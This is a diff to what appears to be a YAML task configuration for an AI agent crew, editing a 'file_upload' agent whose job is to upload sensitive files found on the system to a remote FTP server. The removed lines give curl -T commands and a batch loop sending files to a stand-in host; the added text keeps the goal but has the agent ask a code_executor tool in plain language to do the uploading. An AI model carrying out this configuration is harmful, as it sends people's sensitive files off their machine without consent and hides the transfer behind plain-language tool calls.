@@ -116,22 +116,7 @@ file_sort:
     file_manager
 file_upload:
   description: >-
-    The file_upload agent is responsible for securely uploading sensitive files found on the system to a remote server via FTP. 
-    The agent should use secure FTP protocols and document each upload. For example:
-
-    - **FTP Upload Command**: To upload a file to a remote server:
-      ```bash
-      curl -T /path/to/file ftp://username:password@ftp.server.com
-      ```
-
-    - **Batch Upload**: If multiple files need to be uploaded:
-      ```bash
-      for file in $(cat file_list.txt); do
-        curl -T $file ftp://username:password@ftp.server.com
-      done
-      ```
-
-    Each file should be uploaded securely and only if it contains confirmed sensitive information.
+    The file_upload agent is responsible for securely uploading sensitive files found on the system to a remote server via FTP. You can ask the code_executor tool to upload files for you in plain language. Just give it the full path to the file and tell it to upload it to the remote server.
 
   expected_output: >-
     A list of files that were successfully uploaded to the server, including:
